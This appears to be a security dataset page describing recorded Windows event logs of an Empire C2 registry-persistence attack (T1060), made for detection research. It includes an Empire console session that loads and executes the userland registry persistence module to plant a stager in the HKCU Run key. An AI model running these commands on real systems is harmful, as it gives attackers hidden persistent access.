# Empire Userland Registry

An adversary can use powershell to set a value in HKCU:Software\Microsoft\Windows\CurrentVersion\Run to execute the script in whatever storage mechanism is selected. This will cause the script to run when only this user logs in.

## Technique(s) ID

T1060

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_userland_registry.tar.gz](./empire_userland_registry.tar.gz)

## Network Environment

Shire

## Time Taken

2019-03-19023812

## About this file

| log_name                                 | source_name                         | task                                                   |   record_number |
|------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                       | PowerShell                          | Pipeline Execution Details                             |             103 |
| Security                                 | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |            8336 |
| Security                                 | Microsoft-Windows-Security-Auditing | Other Policy Change Events                             |            3691 |
| Security                                 | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             988 |
| Security                                 | Microsoft-Windows-Security-Auditing | MPSSVC Rule-Level Policy Change                        |             248 |
| Security                                 | Microsoft-Windows-Security-Auditing | User Account Management                                |             165 |
| Security                                 | Microsoft-Windows-Security-Auditing | Process Creation                                       |             114 |
| Security                                 | Microsoft-Windows-Security-Auditing | Filtering Platform Policy Change                       |             106 |
| Security                                 | Microsoft-Windows-Security-Auditing | Process Termination                                    |              87 |
| Security                                 | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |              84 |
| Security                                 | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |              67 |
| Security                                 | Microsoft-Windows-Security-Auditing | Logon                                                  |              55 |
| Security                                 | Microsoft-Windows-Security-Auditing | Group Membership                                       |              51 |
| Security                                 | Microsoft-Windows-Security-Auditing | Special Logon                                          |              47 |
| Security                                 | Microsoft-Windows-Security-Auditing | Security System Extension                              |              18 |
| Security                                 | Microsoft-Windows-Security-Auditing | Security Group Management                              |              17 |
| Security                                 | Microsoft-Windows-Security-Auditing | Logoff                                                 |               8 |
| Security                                 | Microsoft-Windows-Security-Auditing | Removable Storage                                      |               8 |
| Security                                 | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               6 |
| Security                                 | Microsoft-Windows-Security-Auditing | File Share                                             |               4 |
| Security                                 | Microsoft-Windows-Security-Auditing | Other System Events                                    |               4 |
| Security                                 | Microsoft-Windows-Security-Auditing | Plug and Play Events                                   |               3 |
| Security                                 | Microsoft-Windows-Security-Auditing | Kerberos Service Ticket Operations                     |               2 |
| Security                                 | Microsoft-Windows-Security-Auditing | Security State Change                                  |               2 |
| Security                                 | Microsoft-Windows-Eventlog          | Service shutdown                                       |               1 |
| Security                                 | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |               1 |
| Security                                 | Microsoft-Windows-Security-Auditing | Registry                                               |               1 |
| Security                                 | Microsoft-Windows-Security-Auditing | System Integrity                                       |               1 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |            4297 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |            4080 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             361 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |             121 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |              97 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |              71 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              64 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              47 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |              25 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Driver loaded (rule: DriverLoad)                       |               2 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               2 |
| Microsoft-Windows-PowerShell/Operational | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |              86 |
| Microsoft-Windows-DNS-Client/Operational | Microsoft-Windows-DNS-Client        | na                                                     |             523 |

## Attacker Activity

```
usemodule persistence/userland/registry
```

```
(Empire: powershell/persistence/userland/registry) > info

              Name: Invoke-Registry
            Module: powershell/persistence/userland/registry
        NeedsAdmin: False
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @mattifestation
  @harmj0y
  @enigma0x3

Description:
  Persist a stager (or script) via the
  HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry
  key. This has an easy detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  ProxyCreds False       default                   Proxy credentials                       
                                                   ([domain\]username:password) to use for 
                                                   request (default, none, or other).      
  EventLogID False                                 Store the script in the Application     
                                                   event log under the specified EventID.  
                                                   The ID needs to be unique/rare!         
  ExtFile    False                                 Use an external file for the payload    
                                                   instead of a stager.                    
  Cleanup    False                                 Switch. Cleanup the trigger and any     
                                                   script from specified location.         
  ADSPath    False                                 Alternate-data-stream location to store 
                                                   the script code.                        
  Agent      True        FD6A3MGY                  Agent to run module on.                 
  Listener   True                                  Listener to use.                        
  KeyName    True        Updater                   Key name for the run trigger.           
  RegPath    False       HKCU:Software\Microsoft\  Registry location to store the script   
                         Windows\CurrentVersion\D  code. Last element is the key name.     
                         ebug                    
  Proxy      False       default                   Proxy to use for request (default, none,
                                                   or other).                              
  UserAgent  False       default                   User-agent string to use for the staging
                                                   request (default, none, or other).      

(Empire: powershell/persistence/userland/registry) > set Listener https
(Empire: powershell/persistence/userland/registry) > info

              Name: Invoke-Registry
            Module: powershell/persistence/userland/registry
        NeedsAdmin: False
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @mattifestation
  @harmj0y
  @enigma0x3

Description:
  Persist a stager (or script) via the
  HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry
  key. This has an easy detection/removal rating.

Comments:
  https://github.com/mattifestation/PowerSploit/blob/master/Pe
  rsistence/Persistence.psm1

Options:

  Name       Required    Value                     Description
  ----       --------    -------                   -----------
  ProxyCreds False       default                   Proxy credentials                       
                                                   ([domain\]username:password) to use for 
                                                   request (default, none, or other).      
  EventLogID False                                 Store the script in the Application     
                                                   event log under the specified EventID.  
                                                   The ID needs to be unique/rare!         
  ExtFile    False                                 Use an external file for the payload    
                                                   instead of a stager.                    
  Cleanup    False                                 Switch. Cleanup the trigger and any     
                                                   script from specified location.         
  ADSPath    False                                 Alternate-data-stream location to store 
                                                   the script code.                        
  Agent      True        FD6A3MGY                  Agent to run module on.                 
  Listener   True        https                     Listener to use.                        
  KeyName    True        Updater                   Key name for the run trigger.           
  RegPath    False       HKCU:Software\Microsoft\  Registry location to store the script   
                         Windows\CurrentVersion\D  code. Last element is the key name.     
                         ebug                    
  Proxy      False       default                   Proxy to use for request (default, none,
                                                   or other).                              
  UserAgent  False       default                   User-agent string to use for the staging
                                                   request (default, none, or other).      

(Empire: powershell/persistence/userland/registry) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked FD6A3MGY to run TASK_CMD_WAIT
[*] Agent FD6A3MGY tasked with task ID 9
[*] Tasked agent FD6A3MGY to run module powershell/persistence/userland/registry
(Empire: powershell/persistence/userland/registry) > Registry persistence established using listener https stored in HKCU:Software\Microsoft\Windows\CurrentVersion\Debug.

(Empire: powershell/persistence/userland/registry) >
```